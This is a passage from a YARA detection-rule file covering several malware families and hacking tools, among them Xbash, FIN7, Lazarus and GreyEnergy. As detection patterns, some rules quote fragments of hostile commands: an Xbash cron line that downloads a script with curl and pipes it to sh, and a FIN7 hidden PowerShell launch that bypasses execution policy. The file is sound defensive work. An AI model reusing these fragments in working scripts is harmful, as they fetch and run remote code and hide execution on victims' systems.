      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, LINUX, MAL"
      minimum_yara = "1.7"
      
   strings:
      $c01 = { 50 4F 53 54 20 2F 63 64 6E 2D 63 67 69 2F 00 00
               20 48 54 54 50 2F 31 2E 31 0D 0A 55 73 65 72 2D
               41 67 65 6E 74 3A 20 00 0D 0A 48 6F 73 74 3A } 
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 200KB and all of them
} 

rule SUSP_Win32dll_String_RID2E60 : DEMO SUSP T1136 {
   meta:
      description = "Detects suspicious string in executables"
      author = "Florian Roth"
      reference = "https://medium.com/@Sebdraven/apt-sidewinder-changes-theirs-ttps-to-install-their-backdoor-f92604a2739"
      date = "2018-10-24 11:11:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "win32dll.dll" fullword ascii
   condition: 
      filesize < 60KB and all of them
} 

rule VUL_JQuery_FileUpload_CVE_2018_9206_RID32A2 : DEMO EXPLOIT T1136 VULN {
   meta:
      description = "Detects JQuery File Upload vulnerability CVE-2018-9206"
      author = "Florian Roth"
      reference = "https://www.zdnet.com/article/zero-day-in-popular-jquery-plugin-actively-exploited-for-at-least-three-years/"
      date = "2018-10-19 14:13:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXPLOIT, T1136, VULN"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "error_reporting(E_ALL | E_STRICT);" fullword ascii
      $s2 = "require('UploadHandler.php');" fullword ascii
      $s3 = "$upload_handler = new UploadHandler();" fullword ascii
   condition: 
      all of them
} 

rule APT_GreyEnergy_Malware_Oct18_1_RID31FC : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects samples from Grey Energy report"
      author = "Florian Roth"
      reference = "https://www.welivesecurity.com/2018/10/17/greyenergy-updated-arsenal-dangerous-threat-actors/"
      date = "2018-10-17 13:45:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "%SystemRoot%\\System32\\thinmon.dll" fullword ascii
      $s2 = "'Cannot delete list entry (fatal error)!9The module %s cannot be executed on this system (0x%.4x).%Enumerate all sessions on TSE" wide
      $s8 = "cbecbecbecbecbecbecbecbecbecbecbecbecbecbecbecbecbecbecbecbecbecbecbecbe" ascii
      $s14 = "configure the service" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and pe.imphash ( ) == "98d1ad672d0db4b4abdcda73cc9835cb" and all of them
} 

rule APT_GreyEnergy_Malware_Oct18_2_RID31FD : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects samples from Grey Energy report"
      author = "Florian Roth"
      reference = "https://www.welivesecurity.com/2018/10/17/greyenergy-updated-arsenal-dangerous-threat-actors/"
      date = "2018-10-17 13:46:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "WioGLtonuaptWmrnttfepgetneemVsnygnV" fullword ascii
      $s2 = "PnSenariopoeKerGEtxrcy" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 2 of them
} 

rule APT_GreyEnergy_Malware_Oct18_3_RID31FE : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects samples from Grey Energy report"
      author = "Florian Roth"
      reference = "https://www.welivesecurity.com/2018/10/17/greyenergy-updated-arsenal-dangerous-threat-actors/"
      date = "2018-10-17 13:46:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "USQTUNPPQONOPOQUMSNUTRMRRLVPUOPMROPMPMQTPNPONVUOUQOMMNNSRSRQQVTPPRSSNVSTURTMMOPTONSQTOMONQVMQNUSONTQTUTSRRPVTONUQNORQMRRNRUSPS" fullword ascii
      $x2 = "tEMPiuP" fullword ascii
      $x3 = "sryCEMieye" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them
} 

rule APT_GreyEnergy_Malware_Oct18_4_RID31FF : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects samples from Grey Energy report"
      author = "Florian Roth"
      reference = "https://www.welivesecurity.com/2018/10/17/greyenergy-updated-arsenal-dangerous-threat-actors/"
      date = "2018-10-17 13:46:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "iiodttd.eWt" fullword ascii
      $x2 = "irnnaar-ite-ornaa-naa-asoeienaeaanlagoeas:acnuihaaa" fullword ascii
      $x3 = "NURVNTURVORSMSPPRTQMPTTQOQRP" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == "279adfbd42308a07b3131ee57d067b3e" or 1 of them )
} 

rule APT_GreyEnergy_Malware_Oct18_5_RID3200 : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects samples from Grey Energy report"
      author = "Florian Roth"
      reference = "https://www.welivesecurity.com/2018/10/17/greyenergy-updated-arsenal-dangerous-threat-actors/"
      date = "2018-10-17 13:46:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s12 = "WespySSld.eQ" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them
} 

rule SUSP_Size_of_ASUS_TuningTool_RID3197 : DEMO EXE FILE SUSP T1136 {
   meta:
      description = "Detects an ASUS tuning tool with a suspicious size"
      author = "Florian Roth"
      reference = "https://www.welivesecurity.com/2018/10/17/greyenergy-updated-arsenal-dangerous-threat-actors/"
      date = "2018-10-17 13:29:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\Release\\ASGT.pdb" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and filesize > 70KB and all of them
} 

rule MAL_JRAT_Oct18_1_RID2BF9 : DEMO FILE MAL T1136 {
   meta:
      description = "Detects JRAT malware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-10-11 09:29:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "/JRat.class" ascii
   condition: 
      uint16 ( 0 ) == 0x4b50 and filesize < 700KB and 1 of them
} 

rule HKTL_SqlMap_RID2AF1 : DEMO HKTL T1136 {
   meta:
      description = "Detects sqlmap hacktool"
      author = "Florian Roth"
      reference = "https://github.com/sqlmapproject/sqlmap"
      date = "2018-10-09 09:33:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "if cmdLineOptions.get(\"sqlmapShell\"):" fullword ascii
      $x2 = "if conf.get(\"dumper\"):" fullword ascii
   condition: 
      filesize < 50KB and 1 of them
} 

rule HKTL_SqlMap_backdoor_RID2E95 : DEMO FILE HKTL MAL SUSP {
   meta:
      description = "Detects SqlMap backdoors"
      author = "Florian Roth"
      reference = "https://github.com/sqlmapproject/sqlmap"
      date = "2018-10-09 11:20:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, HKTL, MAL, SUSP"
      minimum_yara = "1.7"
      
   condition: 
      ( uint32 ( 0 ) == 0x8e859c07 or uint32 ( 0 ) == 0x2d859c07 or uint32 ( 0 ) == 0x92959c07 or uint32 ( 0 ) == 0x929d9c07 or uint32 ( 0 ) == 0x29959c07 or uint32 ( 0 ) == 0x2b8d9c07 or uint32 ( 0 ) == 0x2b859c07 or uint32 ( 0 ) == 0x28b59c07 ) and filesize < 2KB
} 

rule SUSP_Script_Obfuscation_Char_Concat_RID34A0 : DEMO OBFUS SUSP T1027 T1136 {
   meta:
      description = "Detects strings found in sample from CN group repo leak in October 2018"
      author = "Florian Roth"
      reference = "https://twitter.com/JaromirHorejsi/status/1047084277920411648"
      date = "2018-10-04 15:38:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, OBFUS, SUSP, T1027, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\"c\" & \"r\" & \"i\" & \"p\" & \"t\"" ascii
   condition: 
      1 of them
} 

rule SUSP_SFX_cmd_RID2B3F : DEMO EXE FILE SUSP {
   meta:
      description = "Detects suspicious SFX as used by Gamaredon group"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-09-27 08:58:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, SUSP"
      minimum_yara = "2.2.0"
      
   strings:
      $s1 = /RunProgram=\"hidcon:[a-zA-Z0-9]{1,16}.cmd/ fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them
} 

rule SUSP_SFX_RunProgram_WScript_RID3143 : DEMO EXE FILE SUSP T1136 {
   meta:
      description = "Detects suspicious SFX as used by Gamaredon group"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-09-27 13:15:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "RunProgram=\"wscript.exe" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 10000KB and 1 of them
} 

rule SUSP_CMD_Var_Expansion_RID2F2B : DEMO FILE SUSP T1136 T1193 T1203 {
   meta:
      description = "Detects Office droppers that include a variable expansion string"
      author = "Florian Roth"
      reference = "https://twitter.com/asfakian/status/1044859525675843585"
      date = "2018-09-26 11:45:41"
      score = 45
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SUSP, T1136, T1193, T1203"
      minimum_yara = "1.7"
      
   strings:
      $a1 = " /V:ON" ascii wide fullword
   condition: 
      uint16 ( 0 ) == 0xcfd0 and filesize < 500KB and $a1
} 

rule MAL_Xbash_PY_Sep18_RID2D38 : DEMO FILE MAL {
   meta:
      description = "Detects Xbash malware"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2018/09/unit42-xbash-combines-botnet-ransomware-coinmining-worm-targets-linux-windows/"
      date = "2018-09-18 10:22:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, MAL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = { 73 58 62 61 73 68 00 00 00 00 00 00 00 00 } 
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 10000KB and 1 of them
} 

rule MAL_Xbash_SH_Sep18_RID2D2A : DEMO FILE MAL T1136 {
   meta:
      description = "Detects Xbash malware"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2018/09/unit42-xbash-combines-botnet-ransomware-coinmining-worm-targets-linux-windows/"
      date = "2018-09-18 10:20:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "echo \"*/5 * * * * curl -fsSL" fullword ascii
      $s2 = ".sh|sh\" > /var/spool/cron/root" fullword ascii
      $s3 = "#chmod +x /tmp/hawk" fullword ascii
      $s4 = "if [ ! -f \"/tmp/root.sh\" ]" fullword ascii
      $s5 = ".sh > /tmp/lower.sh" fullword ascii
      $s6 = "chmod 777 /tmp/root.sh" fullword ascii
      $s7 = "-P /tmp && chmod +x /tmp/pools.txt" fullword ascii
      $s8 = "-C /tmp/pools.txt>/dev/null 2>&1" ascii
   condition: 
      uint16 ( 0 ) == 0x2123 and filesize < 3KB and 1 of them
} 

rule MAL_Xbash_JS_Sep18_RID2D2C : DEMO FILE MAL T1136 {
   meta:
      description = "Detects XBash malware"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2018/09/unit42-xbash-combines-botnet-ransomware-coinmining-worm-targets-linux-windows/"
      date = "2018-09-18 10:20:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "var path=WSHShell" fullword ascii
      $s2 = "var myObject= new ActiveXObject(" fullword ascii
      $s3 = "window.resizeTo(0,0)" fullword ascii
      $s4 = "<script language=\"JScript\">" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x483c and filesize < 5KB and 8 of them
} 

rule SUSP_Microsoft_7z_SFX_Combo_RID3120 : ANOMALY DEMO EXE FILE SUSP T1136 {
   meta:
      description = "Detects a suspicious file that has a Microsoft copyright and is a 7z SFX"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-09-16 13:09:11"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "ANOMALY, DEMO, EXE, FILE, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "7ZSfx%03x.cmd" fullword wide
      $s2 = "7z SFX: error" fullword ascii
      $c1 = { 00 4C 00 65 00 67 00 61 00 6C 00 43 00 6F 00 70
              00 79 00 72 00 69 00 67 00 68 00 74 00 00 00 A9
              00 20 00 4D 00 69 00 63 00 72 00 6F 00 73 00 6F
              00 66 00 74 00 20 00 43 00 6F 00 72 00 70 00 6F
              00 72 00 61 00 74 00 69 00 6F 00 6E 00 2E 00 20
              00 41 00 6C 00 6C 00 20 00 72 00 69 00 67 00 68
              00 74 00 73 00 20 00 72 00 65 00 73 00 65 00 72
              00 76 00 65 00 64 00 2E } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of ( $s* ) and $c1
} 

rule SUSP_Microsoft_RAR_SFX_Combo_RID3154 : ANOMALY DEMO EXE FILE SUSP T1136 {
   meta:
      description = "Detects a suspicious file that has a Microsoft copyright and is a RAR SFX"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-09-16 13:17:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "ANOMALY, DEMO, EXE, FILE, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "winrarsfxmappingfile.tmp" fullword wide
      $s2 = "WinRAR self-extracting archive" fullword wide
      $s3 = "WINRAR.SFX" fullword
      $c1 = { 00 4C 00 65 00 67 00 61 00 6C 00 43 00 6F 00 70
              00 79 00 72 00 69 00 67 00 68 00 74 00 00 00 A9
              00 20 00 4D 00 69 00 63 00 72 00 6F 00 73 00 6F
              00 66 00 74 00 20 00 43 00 6F 00 72 00 70 00 6F
              00 72 00 61 00 74 00 69 00 6F 00 6E 00 2E 00 20
              00 41 00 6C 00 6C 00 20 00 72 00 69 00 67 00 68
              00 74 00 73 00 20 00 72 00 65 00 73 00 65 00 72
              00 76 00 65 00 64 00 2E } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of ( $s* ) and $c1
} 

rule SUSP_Office_Dropper_Strings_RID318B : DEMO FILE MAL OFFICE SUSP T1136 T1193 T1203 {
   meta:
      description = "Detects Office droppers that include a notice to enable active content"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-09-13 13:27:01"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, MAL, OFFICE, SUSP, T1136, T1193, T1203"
      minimum_yara = "1.7"
      
   strings:
      $a1 = "_VBA_PROJECT" fullword wide
      $s1 = "click enable editing" fullword ascii
      $s2 = "click enable content" fullword ascii
      $s3 = "\"Enable Editing\"" fullword ascii
      $s4 = "\"Enable Content\"" fullword ascii
   condition: 
      uint16 ( 0 ) == 0xcfd0 and filesize < 500KB and $a1 and 1 of ( $s* )
} 

rule HTKL_BlackBone_DriverInjector_RID320D : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Detects BlackBone Driver injector"
      author = "Florian Roth"
      reference = "https://github.com/DarthTon/Blackbone"
      date = "2018-09-11 13:48:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "=INITtH=PAGEtA" fullword ascii
      $s2 = "BBInjectDll" fullword ascii
      $s3 = "LdrLoadDll" fullword ascii
      $s4 = "\\??\\pipe\\%ls" fullword wide
      $s5 = "Failed to retrieve Kernel base address. Aborting" fullword ascii
      $x2 = "BlackBone: %s: APC injection failed with status 0x%X" fullword ascii
      $x3 = "BlackBone: PDE_BASE/PTE_BASE not found " fullword ascii
      $x4 = "%s: Invalid injection type specified - %d" fullword ascii
      $x6 = "Trying to map C:\\windows\\system32\\cmd.exe into current process" fullword wide
      $x7 = "\\BlackBoneDrv\\bin\\" ascii
      $x8 = "DosDevices\\BlackBone" wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 8000KB and ( 3 of them or 1 of ( $x* ) )
} 

rule APT_Lazarus_Aug18_Downloader_1_RID321A : APT DEMO EXE FILE G0032 NK T1136 {
   meta:
      description = "Detects Lazarus Group Malware Downloadery"
      author = "Florian Roth"
      reference = "https://securelist.com/operation-applejeus/87553/"
      date = "2018-08-24 13:50:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0032, NK, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "H:\\DEV\\TManager\\" ascii
      $x2 = "\\Release\\dloader.pdb" ascii
      $x3 = "Z:\\jeus\\" 
      $x4 = "\\Debug\\dloader.pdb" ascii
      $x5 = "Moz&Wie;#t/6T!2yW29ab@ad%Df324V$Yd" fullword ascii
      $s1 = "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)" fullword ascii
      $s2 = "Error protecting memory page" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( ( 1 of ( $x* ) or 2 of them ) )
} 

rule APT_Lazarus_Aug18_1_RID2DAC : APT DEMO EXE FILE G0032 NK T1136 {
   meta:
      description = "Detects Lazarus Group Malware"
      author = "Florian Roth"
      reference = "https://securelist.com/operation-applejeus/87553/"
      date = "2018-08-24 10:41:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0032, NK, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $s1 = "mws2_32.dll" fullword wide
      $s2 = "%s.bat" fullword wide
      $s3 = "%s%s%s \"%s > %s 2>&1\"" fullword wide
      $s4 = "Microsoft Corporation. All rights reserved." fullword wide
      $s5 = "ping 127.0.0.1 -n 3" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( pe.imphash ( ) == "3af996e4f960108533e69b9033503f40" or 4 of them )
} 

rule APT_Lazarus_Aug18_2_RID2DAD : APT DEMO EXE FILE G0032 NK T1136 {
   meta:
      description = "Detects Lazarus Group Malware"
      author = "Florian Roth"
      reference = "https://securelist.com/operation-applejeus/87553/"
      date = "2018-08-24 10:42:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0032, NK, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "vAdvapi32.dll" fullword wide
      $s2 = "lws2_32.dll" fullword wide
      $s3 = "%s %s > \"%s\" 2>&1" fullword wide
      $s4 = "Not Service" fullword wide
      $s5 = "ping 127.0.0.1 -n 3" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( 4 of them )
} 

rule EXP_DriveCrypt_1_RID2CF9 : DEMO EXE EXPLOIT FILE T1136 {
   meta:
      description = "Detects DriveCrypt exploit"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-08-21 10:12:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, EXPLOIT, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "x64passldr.exe" fullword ascii
      $s2 = "DCR.sys" fullword ascii
      $s3 = "amd64\\x64pass.sys" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 2 of them
} 

rule EXP_DriveCrypt_x64passldr_RID30A3 : DEMO EXE EXPLOIT FILE T1136 {
   meta:
      description = "Detects DriveCrypt exploit"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-08-21 12:48:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, EXPLOIT, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\x64\\x64passldr.pdb" ascii
      $s2 = "\\amd64\\x64pass.sys" fullword wide
      $s3 = "\\\\.\\DCR" fullword ascii
      $s4 = "Open SC Mgr Error" fullword ascii
      $s5 = "thing is ok " fullword ascii
      $s6 = "x64pass" fullword wide
      $s7 = "%ws\\%ws\\Security" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 3 of them
} 

rule MAL_Metasploit_Framework_UA_RID316E : DEMO EXE FILE METASPLOIT SUSP T1136 {
   meta:
      description = "Detects User Agent used in Metasploit Framework"
      author = "Florian Roth"
      reference = "https://github.com/rapid7/metasploit-framework/commit/12a6d67be48527f5d3987e40cac2a0cbb4ab6ce7"
      date = "2018-08-16 13:22:11"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, METASPLOIT, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of them
} 

rule APT_HiddenCobra_GhostSecret_1_RID31E2 : APT DEMO EXE FILE G0032 NK T1136 {
   meta:
      description = "Detects Hidden Cobra Sample"
      author = "Florian Roth"
      reference = "https://securingtomorrow.mcafee.com/mcafee-labs/analyzing-operation-ghostsecret-attack-seeks-to-steal-data-worldwide/"
      date = "2018-08-11 13:41:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0032, NK, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "%s\\%s.dll" fullword wide
      $s2 = "PROXY_SVC_DLL.dll" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and all of them
} 

rule APT_HiddenCobra_GhostSecret_2_RID31E3 : APT DEMO EXE FILE G0032 NK T1136 {
   meta:
      description = "Detects Hidden Cobra Sample"
      author = "Florian Roth"
      reference = "https://securingtomorrow.mcafee.com/mcafee-labs/analyzing-operation-ghostsecret-attack-seeks-to-steal-data-worldwide/"
      date = "2018-08-11 13:41:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0032, NK, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "ping 127.0.0.1 -n 3" fullword wide
      $s2 = "Process32" fullword ascii
      $s11 = "%2d%2d%2d%2d%2d%2d" fullword ascii
      $s12 = "del /a \"" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them
} 

rule SUSP_certificate_payload_RID3087 : DEMO FILE SUSP T1136 {
   meta:
      description = "Detects payloads that pretend to be certificates"
      author = "Didier Stevens, Florian Roth"
      reference = "https://blog.nviso.be/2018/08/02/powershell-inside-a-certificate-part-3/"
      date = "2018-08-02 12:43:41"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $re1 = "-----BEGIN CERTIFICATE-----" 
      $fp1 = "replace it with the PEM-encoded root certificate" 
   condition: 
      uint32 ( 0 ) == 0x2D2D2D2D and $re1 at 0 and not uint8 ( 29 ) == 0x4D and not uint8 ( 28 ) == 0x4D and not 1 of ( $fp* )
} 

rule APT_FIN7_Strings_Aug18_1_RID2F27 : APT DEMO G0046 RUSSIA T1136 {
   meta:
      description = "Detects strings from FIN7 report in August 2018"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"
      date = "2018-08-01 11:45:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, G0046, RUSSIA, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "&&call %a01%%a02% /e:jscript" ascii
      $s2 = "wscript.exe //b /e:jscript %TEMP%" ascii
      $s3 = " w=wsc@ript /b " ascii
      $s4 = "@echo %w:@=%|cmd" ascii
      $s5 = " & wscript //b /e:jscript" 
   condition: 
      1 of them
} 

rule APT_FIN7_Sample_Aug18_2_RID2EA0 : APT DEMO FILE G0046 RUSSIA T1136 {
   meta:
      description = "Detects FIN7 malware sample"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"
      date = "2018-08-01 11:22:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0046, RUSSIA, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Description: C:\\Users\\oleg\\Desktop\\" wide
      $x2 = "/*|*| *  Copyright 2016 Microsoft, Industries.|*| *  All rights reserved.|*|" ascii
      $x3 = "32, 40, 102, 105, 108, 101, 95, 112, 97, 116, 104, 41, 41, 32" ascii
      $x4 = "83, 108, 101, 101, 112, 40, 51, 48, 48, 48, 41, 59, 102, 115" ascii
      $x5 = "80, 80, 68, 65, 84, 65, 37, 34, 41, 44, 115, 104, 101, 108, 108" ascii
   condition: 
      uint16 ( 0 ) == 0xcfd0 and filesize < 2000KB and 1 of them
} 

rule APT_FIN7_MalDoc_Aug18_1_RID2E6D : APT DEMO G0046 RUSSIA T1136 {
   meta:
      description = "Detects malicious Doc from FIN7 campaign"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"
      date = "2018-08-01 11:14:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, G0046, RUSSIA, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<photoshop:LayerText>If this document was downloaded from your email, please click  \"Enable editing\" from the yellow bar above" ascii
   condition: 
      filesize < 800KB and 1 of them
} 

rule APT_FIN7_Sample_Aug18_1_RID2E9F : APT DEMO FILE G0046 RUSSIA T1057 T1136 {
   meta:
      description = "Detects FIN7 samples mentioned in FireEye report"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"
      date = "2018-08-01 11:22:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0046, RUSSIA, T1057, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\par var console=\\{\\};console.log=function()\\{\\};" fullword ascii
      $s2 = "616e64792d7063" ascii
      $x1 = "0043003a005c00550073006500720073005c0061006e00640079005c004400650073006b0074006f0070005c0075006e00700072006f0074006500630074" ascii
      $x2 = "780065006300750074006500280022004f006e0020004500720072006f007200200052006500730075006d00650020004e006500780074003a0073006500" ascii
      $x3 = "\\par \\tab \\tab \\tab sh.Run \"powershell.exe -NoE -NoP -NonI -ExecutionPolicy Bypass -w Hidden -File \" & pToPSCb, 0, False" fullword ascii
      $x4 = "002e006c006e006b002d00000043003a005c00550073006500720073005c007400650073007400610064006d0069006e002e0054004500530054005c0044" ascii
